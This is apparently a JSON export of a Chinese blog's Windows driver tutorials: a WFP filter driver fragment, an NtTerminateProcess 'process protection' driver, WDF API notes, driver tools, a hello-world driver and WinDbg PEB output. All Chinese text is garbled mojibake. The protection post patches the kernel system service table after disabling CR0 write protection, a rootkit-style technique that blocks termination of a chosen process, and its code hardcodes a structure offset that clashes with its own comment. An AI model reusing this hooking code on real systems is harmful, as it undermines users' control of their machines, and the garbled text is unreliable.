DbgPrint(&quot;é©±åŠ¨å¸è½½æˆåŠŸ\\n&quot;);&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING registryPath)&#123; UNICODE_STRING deviceName = &#123; 0 &#125;; UNICODE_STRING deviceDosName = &#123; 0 &#125;; NTSTATUS status = STATUS_SUCCESS; driverObject-&gt;DriverUnload = DriverUnload; RtlInitUnicodeString(&amp;deviceName, DEVICE_NAME); status = IoCreateDevice(driverObject, 0, &amp;deviceName, FILE_DEVICE_NETWORK, 0, FALSE, &amp;gDevObj); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;åˆ›å»ºè®¾å¤‡å¯¹è±¡å¤±è´¥\\n&quot;); return STATUS_UNSUCCESSFUL; &#125; RtlInitUnicodeString(&amp;deviceDosName, DEVICE_DOSNAME); status = IoCreateSymbolicLink(&amp;deviceDosName, &amp;deviceName); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;åˆ›å»ºç¬¦å·é“¾æ¥å¤±è´¥\\n&quot;); return STATUS_UNSUCCESSFUL; &#125; status = WallRegisterCallouts(); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;WallRegisterCallouts å¤±è´¥!\\n&quot;); return STATUS_UNSUCCESSFUL; &#125; DbgPrint(&quot;è¿‡æ»¤é©±åŠ¨åŠ è½½æˆåŠŸ\\n&quot;); return status;&#125;","tags":[{"name":"é©±åŠ¨","slug":"é©±åŠ¨","permalink":"https://hodlyounger.github.io/tags/%E9%A9%B1%E5%8A%A8/"},{"name":"windows/é©±åŠ¨","slug":"windows-é©±åŠ¨","permalink":"https://hodlyounger.github.io/tags/windows-%E9%A9%B1%E5%8A%A8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"é©±åŠ¨","slug":"A-OS/Windows/é©±åŠ¨","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"}]},{"title":"ã€é©±åŠ¨ã€‘ä¿æŠ¤è¿›ç¨‹","date":"2023-10-27T01:24:02.088Z","path":"A_OS/Windows/é©±åŠ¨/ã€é©±åŠ¨ã€‘ä¿æŠ¤è¿›ç¨‹/","text":"æ¦‚è¿°ï¼šwindows é©±åŠ¨å®ç°å¯¹è¿›ç¨‹çš„ä¿æŠ¤ 0x01 è¯´æ˜ ä¸»è¦çš„é€»è¾‘æ˜¯åœ¨é©±åŠ¨ä¸­ hook NtTerminateProcess å‡½æ•° 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133#include &lt;Ntifs.h&gt;//0x7A NTOpenProcess//0x101 NtTerminateProcess#define FuctionID 0x101 //è°ƒç”¨å·void PageProtectOn()&#123; //æ¢å¤å†…å­˜ä¿æŠ¤ __asm &#123; mov eax,cr0 or eax,10000h mov cr0,eax sti &#125;&#125;void PageProtectOff()&#123; //å»æ‰å†…å­˜ä¿æŠ¤ __asm &#123; cli mov eax,cr0 and eax,not 10000h mov cr0,eax &#125;&#125;//1ã€æ‰¾åˆ°ç³»ç»ŸæœåŠ¡è¡¨ï¼šå‡½æ•°åœ°å€è¡¨typedef struct _KSYSTEM_SERVICE_TABLE&#123; PULONG ServiceTableBase; //å‡½æ•°åœ°å€è¡¨åŸºåœ°å€ PULONG ServiceCounterTableBase; //è¢«è®¿é—®äº†å¤šå°‘æ¬¡ ULONG NumberOfService; //è¡¨ä¸­æœåŠ¡å‡½æ•°çš„æ€»æ•° PUCHAR ParamTableBase; //æœåŠ¡å‡½æ•°çš„å‚æ•°ä¸ªæ•°æ•°ç»„çš„èµ·å§‹åœ°å€&#125;KSYSTEM_SERVICE_TABLE,*PKSYSTEM_SERVICE_TABLE;typedef struct _KSERVICE_DESCRIPTOR_TABLE&#123; KSYSTEM_SERVICE_TABLE ntoskrnl;//ntoskrnl.exeçš„å‡½æ•° KSYSTEM_SERVICE_TABLE win32k;//win32k.sysçš„å‡½æ•° KSYSTEM_SERVICE_TABLE notUsed1;// KSYSTEM_SERVICE_TABLE notUsed2;//&#125;KSERVICE_DESCRIPTOR_TABLE,*PKSERVICE_DESCRIPTOR_TABLE;//NtTerminateProcesså‡½æ•°æŒ‡é’ˆtypedef NTSTATUS (*NTTERMINATEPROCESS) (HANDLE ProcessHandle, NTSTATUS ExitStatus);//KeServiceDescriptorTableæ—¶ntoskrnl.exeæ‰€å¯¼å‡ºçš„å…¨å±€å˜é‡ ç”³æ˜ä¸€ä¸‹å°±å¯ä»¥ç›´æ¥ç”¨äº†extern PKSERVICE_DESCRIPTOR_TABLE KeServiceDescriptorTable; //å­˜å‚¨åŸæ¥çš„å‡½æ•°åœ°å€ULONG uOldNtTerminateProcess;//2.å‡†å¤‡ç”¨äºæ›¿æ¢çš„å‡½æ•°NTSTATUS MyNtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus)&#123; //è‡ªå·±çš„ä¸šåŠ¡..å„ç§è¿‡æ»¤ æˆ–è€…ä¿®æ”¹è¿”å›ç»“æœ PEPROCESS pEprocess; NTSTATUS status; PCHAR ImageFileName; //é€šè¿‡å¥æŸ„è·å–EPROCESS status = ObReferenceObjectByHandle(ProcessHandle,FILE_ANY_ACCESS,*PsProcessType,KernelMode,&amp;pEprocess,NULL); if (!NT_SUCCESS(status)) &#123; return status; &#125; //è·å–è¿›ç¨‹åå­— _EPROCESS + 0x171 == ImageFileName ImageFileName = (PCHAR)pEprocess + 0x174; //åˆ¤æ–­æ˜¯å¦æ˜¯è¦ä¿æŠ¤çš„è¿›ç¨‹ if (strcmp(ImageFileName, &quot;notepad.exe&quot;) == 0) &#123; //åˆ¤æ–­å¦‚ä½•é€€å‡º if (ProcessHandle == (HANDLE)0xFFFFFFFF) &#123; //ç‚¹Xå…³é—­ DbgPrint(&quot;ç‚¹Xå…³é—­ æˆåŠŸé€€å‡º:%s: NtTerminateProcess(%x, %x)\\n&quot;, ImageFileName, ProcessHandle, ExitStatus); return ((NTTERMINATEPROCESS)uOldNtTerminateProcess)(ProcessHandle, ExitStatus); &#125; else if(ExitStatus == 1) &#123; // é€šè¿‡ä»»åŠ¡ç®¡ç†å™¨å…³é—­ DbgPrint(&quot;é€šè¿‡ä»»åŠ¡ç®¡ç†å™¨å…³é—­ æ‹’ç»å…³é—­:%s: NtTerminateProcess(%x, %x)\\n&quot;, ImageFileName, ProcessHandle, ExitStatus); return STATUS_ACCESS_DENIED; &#125; else &#123; return STATUS_ACCESS_DENIED; &#125; &#125; return ((NTTERMINATEPROCESS)uOldNtTerminateProcess)(ProcessHandle, ExitStatus);&#125;//3.ä¿®æ”¹å‡½æ•°åœ°å€NTSTATUS HookNtTerminateProcess()&#123; NTSTATUS Status; Status = STATUS_SUCCESS; PageProtectOff(); uOldNtTerminateProcess = KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[FuctionID]; KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[FuctionID] = (ULONG)MyNtTerminateProcess; PageProtectOn(); return Status;&#125;//4.æ¢å¤VOID UnHookNtTerminateProcess()&#123; PageProtectOff(); KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[FuctionID] = (ULONG)uOldNtTerminateProcess; PageProtectOn();&#125;//å¸è½½å‡½æ•°VOID DriverUnload(PDRIVER_OBJECT driver)&#123; UnHookNtTerminateProcess(); KdPrint((&quot;é©±åŠ¨ç¨‹åºåœæ­¢è¿è¡Œäº†.\\r\\n&quot;));&#125;//å…¥å£å‡½æ•°ï¼Œç›¸å½“äºmainNTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING reg_path)&#123; HookNtTerminateProcess(); //æ³¨å†Œé”€æ¯å›è°ƒå‡½æ•° pDriver-&gt;DriverUnload = DriverUnload; return STATUS_SUCCESS;&#125;","tags":[{"name":"è¿›ç¨‹","slug":"è¿›ç¨‹","permalink":"https://hodlyounger.github.io/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"é©±åŠ¨","slug":"é©±åŠ¨","permalink":"https://hodlyounger.github.io/tags/%E9%A9%B1%E5%8A%A8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"é©±åŠ¨","slug":"A-OS/Windows/é©±åŠ¨","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"}]},{"title":"ã€é©±åŠ¨ã€‘å¼€å‘ç›¸å…³APIæ•´ç†","date":"2023-10-27T01:24:02.086Z","path":"A_OS/Windows/é©±åŠ¨/windowsé©±åŠ¨å¼€å‘æ•™ç¨‹/ã€é©±åŠ¨ã€‘å¼€å‘ç›¸å…³APIæ•´ç†/","text":"æ¦‚è¿°ï¼šé©±åŠ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œç›¸å…³APIçš„å­¦ä¹ æ•´ç† [toc] WdfDriverCreate WdfDriverCreate æ˜¯ Windows Driver Frameworks (WDF) ä¸­ç”¨äºåˆ›å»ºé©±åŠ¨ç¨‹åºçš„å‡½æ•°ã€‚å®ƒç”¨äºåˆå§‹åŒ–é©±åŠ¨ç¨‹åºï¼Œå¹¶å°†å…¶ä¸ Windows æ“ä½œç³»ç»Ÿè¿›è¡Œé›†æˆã€‚ WdfDriverCreate å‡½æ•°éœ€è¦å¡«å†™ä¸€ä¸ª WDFDRIVER ç»“æ„ä½“æ¥å®šä¹‰é©±åŠ¨ç¨‹åºçš„å±æ€§å’Œè¡Œä¸ºã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„å‚æ•°ï¼š DriverName: é©±åŠ¨ç¨‹åºçš„åç§°ï¼Œç”¨äºåœ¨è°ƒè¯•å’Œæ—¥å¿—è®°å½•ä¸­æ ‡è¯†é©±åŠ¨ç¨‹åºã€‚ DriverVersion: é©±åŠ¨ç¨‹åºçš„ç‰ˆæœ¬å·ï¼Œç”¨äºæ ‡è¯†é©±åŠ¨ç¨‹åºçš„ç‰ˆæœ¬ã€‚ DeviceAddVersion: ç”¨äºæ·»åŠ æ–°è®¾å¤‡çš„ WDF å‡½æ•°ç‰ˆæœ¬ã€‚ DriverUnload: é©±åŠ¨ç¨‹åºå¸è½½æ—¶çš„å›è°ƒå‡½æ•°ï¼Œç”¨äºæ¸…ç†èµ„æºå¹¶æ‰§è¡Œå…¶ä»–å¿…è¦çš„æ“ä½œã€‚ DispatchTable: ä¸€ä¸ªåŒ…å«é©±åŠ¨ç¨‹åºå¤„ç† IRP è¯·æ±‚çš„å›è°ƒå‡½æ•°çš„è¡¨ã€‚ RegistryPath: é©±åŠ¨ç¨‹åºåœ¨æ³¨å†Œè¡¨ä¸­çš„è·¯å¾„ï¼Œç”¨äºå­˜å‚¨é…ç½®ä¿¡æ¯å’Œè®¾ç½®ã€‚ WdfDeviceCreate WdfDeviceCreate æ˜¯ Windows Driver Frameworks (WDF) ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºåˆ›å»ºè®¾å¤‡å¯¹è±¡å¹¶åˆå§‹åŒ–ä¸è®¾å¤‡ç›¸å…³çš„æ•°æ®ç»“æ„ã€‚å®ƒæ˜¯ WDF ä¸­éå¸¸é‡è¦å’Œå¸¸ç”¨çš„å‡½æ•°ä¹‹ä¸€ã€‚ WdfDeviceCreate å‡½æ•°éœ€è¦å¡«å†™ä¸€ä¸ª WDFDEVICE_INIT ç»“æ„ä½“æ¥å®šä¹‰è®¾å¤‡çš„å±æ€§å’Œè¡Œä¸ºã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„å‚æ•°ï¼š Driver: æŒ‡å‘é©±åŠ¨ç¨‹åºçš„æŒ‡é’ˆï¼Œç”¨äºå…³è”è®¾å¤‡å’Œé©±åŠ¨ç¨‹åºã€‚ DeviceAttributes: æŒ‡å‘è°ƒç”¨æ–¹åˆ†é…çš„ WDF_OBJECT_ATTRIBUTES ç»“æ„çš„æŒ‡é’ˆï¼Œè¯¥ç»“æ„åŒ…å«æ–°è®¾å¤‡çš„å±æ€§ã€‚ StackSize: è®¾å¤‡çš„å †æ ˆå¤§å°ï¼Œç”¨äºå®šä¹‰è®¾å¤‡å¯¹è±¡çš„æ‰§è¡Œç¯å¢ƒã€‚ DeviceInit: æŒ‡å‘ WDFDEVICE_INIT ç»“æ„çš„æŒ‡é’ˆçš„åœ°å€ï¼Œç”¨äºåˆå§‹åŒ–è®¾å¤‡çš„çŠ¶æ€å’Œè¡Œä¸ºã€‚ åœ¨è°ƒç”¨ WdfDeviceCreate ä¹‹åï¼ŒWDF å°†ä½¿ç”¨æä¾›çš„å‚æ•°æ¥åˆ›å»ºå¹¶åˆå§‹åŒ–ä¸€ä¸ªè®¾å¤‡å¯¹è±¡ã€‚ç„¶åï¼Œè®¾å¤‡å¯ä»¥ä½¿ç”¨ WDF æä¾›çš„å…¶ä»–å‡½æ•°æ¥ç®¡ç†è®¾å¤‡çš„çŠ¶æ€ã€å¤„ç†è¯·æ±‚ä»¥åŠä¸å…¶ä»–è®¾å¤‡æˆ–é©±åŠ¨ç¨‹åºè¿›è¡Œäº¤äº’ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒWdfDeviceCreate æ˜¯ä¸€ä¸ªé«˜çº§åˆ«çš„å‡½æ•°ï¼Œé€šå¸¸ç”¨äºåˆ›å»ºå®Œæ•´çš„è®¾å¤‡å¯¹è±¡ã€‚å¯¹äºè¾ƒç®€å•çš„è®¾å¤‡æˆ–éœ€è¦æ›´ç²¾ç»†æ§åˆ¶çš„æƒ…å†µï¼Œå¯èƒ½éœ€è¦ä½¿ç”¨å…¶ä»– WDF å‡½æ•°æ¥æ‰‹åŠ¨åˆ›å»ºå’Œé…ç½®è®¾å¤‡å¯¹è±¡ã€‚åŒæ—¶ï¼Œåœ¨ä½¿ç”¨ WdfDeviceCreate å’Œå…¶ä»– WDF å‡½æ•°æ—¶ï¼Œåº”æ³¨æ„éµå¾ªæ­£ç¡®çš„ä½¿ç”¨æ–¹æ³•å’Œè§„èŒƒï¼Œä»¥é¿å…äº§ç”Ÿæ½œåœ¨çš„é—®é¢˜å’Œé£é™©ã€‚","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"windows/é©±åŠ¨","slug":"windows-é©±åŠ¨","permalink":"https://hodlyounger.github.io/tags/windows-%E9%A9%B1%E5%8A%A8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"é©±åŠ¨","slug":"A-OS/Windows/é©±åŠ¨","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"},{"name":"windowsé©±åŠ¨å¼€å‘æ•™ç¨‹","slug":"A-OS/Windows/é©±åŠ¨/windowsé©±åŠ¨å¼€å‘æ•™ç¨‹","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/windows%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E6%95%99%E7%A8%8B/"}]},{"title":"ã€é©±åŠ¨ã€‘å¼€å‘ç›¸å…³å·¥å…·","date":"2023-10-27T01:24:02.086Z","path":"A_OS/Windows/é©±åŠ¨/windowsé©±åŠ¨å¼€å‘æ•™ç¨‹/ã€é©±åŠ¨ã€‘å¼€å‘ç›¸å…³å·¥å…·/","text":"DbgView ç”¨äºæŸ¥çœ‹é©±åŠ¨è¾“å‡ºçš„æ¶ˆæ¯ InstDrv ç”¨æˆ·åŠ è½½ã€å¯åŠ¨ã€åœæ­¢ã€å¸è½½é©±åŠ¨","tags":[{"name":"å·¥å…·","slug":"å·¥å…·","permalink":"https://hodlyounger.github.io/tags/%E5%B7%A5%E5%85%B7/"},{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"é©±åŠ¨","slug":"é©±åŠ¨","permalink":"https://hodlyounger.github.io/tags/%E9%A9%B1%E5%8A%A8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"é©±åŠ¨","slug":"A-OS/Windows/é©±åŠ¨","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"},{"name":"windowsé©±åŠ¨å¼€å‘æ•™ç¨‹","slug":"A-OS/Windows/é©±åŠ¨/windowsé©±åŠ¨å¼€å‘æ•™ç¨‹","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/windows%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E6%95%99%E7%A8%8B/"}]},{"title":"ã€é©±åŠ¨ã€‘Visual Studio 2022 é©±åŠ¨å¼€å‘ç¯å¢ƒå‡†å¤‡","date":"2023-10-27T01:24:02.085Z","path":"A_OS/Windows/é©±åŠ¨/windowsé©±åŠ¨å¼€å‘æ•™ç¨‹/é©±åŠ¨å¼€å‘å‡†å¤‡(VS2022)/","text":"æ¦‚è¿°ï¼šé©±åŠ¨å¼€å‘ç¯å¢ƒå‡†å¤‡ [toc] æ­¥éª¤ä¸€ å®‰è£…sdkä¸wdk å®‰è£…windowsç›¸å…³çš„sdk å‚è€ƒå¾®è½¯æ–‡æ¡£ï¼šä¸‹è½½ Windows é©±åŠ¨ç¨‹åºå·¥å…·åŒ… (WDK) - Windows drivers | Microsoft Learn æ­¥éª¤äºŒ è°ƒè¯•ä¸å®‰è£…å·¥å…· ä¸‹è½½ dbgview dbgview åœ¨ SysinternalsSuite å¥—ä»¶ä¸­ï¼Œä¸‹è½½ SysinternalsSuite å¥—ä»¶å³å¯ã€‚ https://docs.microsoft.com/zh-cn/sysinternals/downloads/ ä¸‹è½½é©±åŠ¨å®‰è£…å™¨ KmdManageré©±åŠ¨åŠ è½½è°ƒè¯•å·¥å…· Kernel Mode Drivers Manager 1.3 free download - Software reviews, downloads, news, free trials, freeware and full commercial software - Downloadcrew PCHunter http://www.xuetr.com/ æ­¥éª¤ä¸‰ é©±åŠ¨æ¡†æ¶ 1234567891011121314151617181920#include &lt;ntddk.h&gt;// #include &lt;ntifs.h&gt;NTSTATUS UnloadDriver(PDRIVER_OBJECT pDriver)&#123; DbgPrint(&quot;Bye, Driver&quot;);&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)&#123; DbgPrint(&quot;Hello World, Driver&quot;); DbgPrint(&quot;DRIVER ADDress, [%]&quot;); DbgPrint(&quot;Hello World, Driver&quot;); pDriver-&gt;DriverUnload = UnloadDriver; return STATUS_SUCCESS;&#125; æ­¥éª¤ä¸‰ Visual Studioé…ç½® C/C++ -&gt; å¸¸è§„ -&gt; å°†è­¦å‘Šè§†ä¸ºé”™è¯¯ -&gt; å¦ C/C++ -&gt; å¸¸è§„ -&gt; è­¦å‘Šç­‰çº§ -&gt; ç­‰çº§3ï¼ˆä¹Ÿå¯å¿½ç•¥ï¼‰ é©±åŠ¨è¿è¡Œç¯å¢ƒ inf2cat -&gt; å¦ ç¼–è¯‘è¿è¡Œï¼Œä¼šç”Ÿæˆsysæ–‡ä»¶ å…¶ä»–è¡¥å…… ç¦ç”¨ç•Œé¢è¾“å‡ºæ— ç”¨ä¿¡æ¯ 12ed nt!Kd_SXS_Masked nt!Kd_FUSION_Mask","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"é©±åŠ¨","slug":"é©±åŠ¨","permalink":"https://hodlyounger.github.io/tags/%E9%A9%B1%E5%8A%A8/"},{"name":"driver","slug":"driver","permalink":"https://hodlyounger.github.io/tags/driver/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"é©±åŠ¨","slug":"A-OS/Windows/é©±åŠ¨","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"},{"name":"windowsé©±åŠ¨å¼€å‘æ•™ç¨‹","slug":"A-OS/Windows/é©±åŠ¨/windowsé©±åŠ¨å¼€å‘æ•™ç¨‹","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/windows%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E6%95%99%E7%A8%8B/"}]},{"title":"ã€é©±åŠ¨ã€‘HelloWorldé©±åŠ¨ä¸å®‰è£…","date":"2023-10-27T01:24:02.084Z","path":"A_OS/Windows/é©±åŠ¨/windowsé©±åŠ¨å¼€å‘æ•™ç¨‹/HelloWorldé©±åŠ¨ä¸å®‰è£…/","text":"æ¦‚è¿°ï¼šå®ç°ä¸€ä¸ªæœ€ç®€å•çš„helloworldé©±åŠ¨ï¼Œå¾®è½¯å®˜æ–¹æœ‰ç›¸å…³æ•™ç¨‹ ç¼–å†™ Hello World Windows é©±åŠ¨ç¨‹åº (KMDF) - Windows drivers | Microsoft Learn Demo 12345678910111213141516171819202122// #include &lt;ntddk.h&gt;#include &lt;ntifs.h&gt;NTSTATUS UnloadDriver(PDRIVER_OBJECT pDriver)&#123; DbgPrint(&quot;Bye, Driver&quot;); return STATUS_SUCCESS;&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)&#123; DbgPrint(&quot;Hello World, Driver&quot;); DbgPrint(&quot;PDRIVER_OBJECT-&gt; [0x%08x]&quot;, pDriver); DbgPrint(&quot;PUNICODE_STRING-&gt;[%ws]&quot;, pReg-&gt;Buffer); pDriver-&gt;DriverUnload = UnloadDriver; return STATUS_SUCCESS;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"é©±åŠ¨","slug":"é©±åŠ¨","permalink":"https://hodlyounger.github.io/tags/%E9%A9%B1%E5%8A%A8/"},{"name":"driver","slug":"driver","permalink":"https://hodlyounger.github.io/tags/driver/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"é©±åŠ¨","slug":"A-OS/Windows/é©±åŠ¨","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"},{"name":"windowsé©±åŠ¨å¼€å‘æ•™ç¨‹","slug":"A-OS/Windows/é©±åŠ¨/windowsé©±åŠ¨å¼€å‘æ•™ç¨‹","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/windows%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E6%95%99%E7%A8%8B/"}]},{"title":"ã€é©±åŠ¨ã€‘Windowså†…æ ¸æ¨¡å—åç§°éå†","date":"2023-10-27T01:24:02.080Z","path":"A_OS/Windows/é©±åŠ¨/EasyDriver/Windowså†…æ ¸æ¨¡å—åç§°éå†/","text":"æ¦‚è¿°ï¼šå†…æ ¸éå†æ¨¡å—åç§° 0x01ã€æŸ¥çœ‹LDR Windows å†…æ ¸æ¨¡å—ä¿¡æ¯æ˜¯ä»¥ç»“æ„ä½“ _LDR_DATA_TABLE_ENTRY å½¢å¼å­˜åœ¨äºç³»ç»Ÿã€‚ _LDR_DATA_TABLE_ENTRY çš„åŸºåœ°å€åœ¨ PEBå½“ä¸­ï¼Œä»¥ä¸‹ä¸ºæ˜¯ä¸€ä¸ªç¤ºä¾‹æŸ¥çœ‹ _LDR_DATA_TABLE_ENTRY ç»“æ„ä½“çš„ç¤ºä¾‹ï¼š ç¯å¢ƒï¼šwindowsåŒæœºè°ƒè¯•ï¼Œè°ƒè¯•ç¯å¢ƒ win10. è°ƒè¯•ï¼Œç›®æ ‡ notepad.exe è·å–è¿›ç¨‹id 123450: kd&gt; !process 0 0 notepad.exePROCESS ffffc6835560a080 SessionId: 1 Cid: 167c Peb: 88dcc01000 ParentCid: 1ad8 DirBase: 6590e000 ObjectTable: ffffdd03a141b380 HandleCount: 520. Image: notepad.exe è·å–LDR 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611620: kd&gt; .process /p ffffc6835560a080; !peb 88dcc01000Implicit process is now ffffc683`5560a080.cache forcedecodeuser donePEB at 00000088dcc01000 InheritedAddressSpace: No ReadImageFileExecOptions: No BeingDebugged: No ImageBaseAddress: 00007ff613310000 NtGlobalFlag: 0 NtGlobalFlag2: 0 Ldr 00007ffb244fc4c0 Ldr.Initialized: Yes Ldr.InInitializationOrderModuleList: 000001acec0f24f0 . 000001acf1b23db0 Ldr.InLoadOrderModuleList: 000001acec0f2660 . 000001acf1b23d90 Ldr.InMemoryOrderModuleList: 000001acec0f2670 . 000001acf1b23da0 Base TimeStamp Module 7ff613310000 52b5327b Dec 21 14:17:31 2013 C:\\Windows\\system32\\notepad.exe 7ffb24390000 feef31d3 Jul 15 16:12:03 2105 C:\\Windows\\SYSTEM32\\ntdll.dll 7ffb23b40000 23c0ab5e Jan 03 19:15:42 1989 C:\\Windows\\System32\\KERNEL32.DLL 7ffb21ae0000 6b4de7c9 Jan 18 18:22:01 2027 C:\\Windows\\System32\\KERNELBASE.dll 7ffb233f0000 7086f0b5 Oct 28 22:20:37 2029 C:\\Windows\\System32\\GDI32.dll 7ffb21de0000 0dcd0213 May 04 04:26:59 1977 C:\\Windows\\System32\\win32u.dll 7ffb21f00000 d31e9fa0 Mar 29 16:45:20 2082 C:\\Windows\\System32\\gdi32full.dll 7ffb21e10000 39255ccf May 19 23:25:03 2000 C:\\Windows\\System32\\msvcp_win.dll 7ffb22180000 2bd748bf Apr 23 09:39:11 1993 C:\\Windows\\System32\\ucrtbase.dll 7ffb22850000 12e47419 Jan 17 20:56:57 1980 C:\\Windows\\System32\\USER32.dll 7ffb23090000 ab88b7a1 Mar 12 22:37:21 2061 C:\\Windows\\System32\\combase.dll 7ffb236b0000 ed79d6e2 Apr 02 14:04:18 2096 C:\\Windows\\System32\\RPCRT4.dll 7ffb238c0000 29534f79 Dec 21 22:28:09 1991 C:\\Windows\\System32\\shcore.dll 7ffb235f0000 564f9f39 Nov 21 06:31:21 2015 C:\\Windows\\System32\\msvcrt.dll 7ffb20490000 db2b08ef Jul 09 13:23:59 2086 C:\\Windows\\WinSxS\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.1110_none_60b5254171f9507e\\COMCTL32.dll 7ffb23050000 68ff10be Oct 27 14:27:10 2025 C:\\Windows\\System32\\IMM32.DLL 5e050000 627c7a26 May 12 11:08:22 2022 C:\\Program Files (x86)\\360\\360Safe\\safemon\\SafeWrapper.dll 7ffb223f0000 c9418262 Dec 30 08:27:14 2076 C:\\Windows\\System32\\ADVAPI32.dll 7ffb224a0000 9003cbde Jul 26 05:45:02 2046 C:\\Windows\\System32\\sechost.dll 7ffb217a0000 618b690d Nov 10 14:39:09 2021 C:\\Program Files (x86)\\360\\360Safe\\safemon\\capid64.dll 7ffb237e0000 19bb5737 Sep 06 22:52:39 1983 C:\\Windows\\System32\\SHLWAPI.dll 7ffb21760000 63e49296 Feb 09 14:28:38 2023 C:\\Program Files (x86)\\360\\360EDRSensor\\safemon\\360EFP64.dll 7ffb21740000 f0713fcd Oct 30 14:42:21 2097 C:\\Windows\\SYSTEM32\\kernel.appcore.dll 7ffb222b0000 856685b0 Dec 03 03:17:04 2040 C:\\Windows\\System32\\bcryptPrimitives.dll 7ffb1e4f0000 16108836 Sep 24 20:23:18 1981 C:\\Windows\\system32\\uxtheme.dll 7ffb23970000 a7c9263e Mar 16 02:13:18 2059 C:\\Windows\\System32\\clbcatq.dll 7ffb18890000 0b3246d4 Dec 15 10:58:28 1975 C:\\Windows\\System32\\MrmCoreR.dll 7ffb23c00000 480c18d7 Apr 21 12:32:23 2008 C:\\Windows\\System32\\SHELL32.dll 7ffb1eac0000 7521c788 Apr 10 02:27:20 2032 C:\\Windows\\SYSTEM32\\windows.storage.dll 7ffb20ec0000 db45726f Jul 29 14:13:03 2086 C:\\Windows\\system32\\Wldp.dll 7ffb23a20000 0e8d3a56 Sep 26 23:42:14 1977 C:\\Windows\\System32\\MSCTF.dll 7ffb225d0000 d42edff1 Oct 22 04:56:17 2082 C:\\Windows\\System32\\OLEAUT32.dll 7ffb14380000 63a36c45 Dec 22 04:27:49 2022 C:\\Windows\\system32\\TextShaping.dll 7ffafdbb0000 97acfd33 Aug 21 20:10:27 2050 C:\\Windows\\System32\\efswrt.dll 7ffb0fb70000 0d302819 Jan 05 05:03:21 1977 C:\\Windows\\System32\\MPR.dll 7ffb1d420000 1b27f2ab Jun 09 12:20:59 1984 C:\\Windows\\SYSTEM32\\wintypes.dll 7ffb1b3f0000 60d2769c Jun 23 07:47:40 2021 C:\\Windows\\System32\\twinapi.appcore.dll 7ffb20e30000 24cdd509 Jul 26 23:13:13 1989 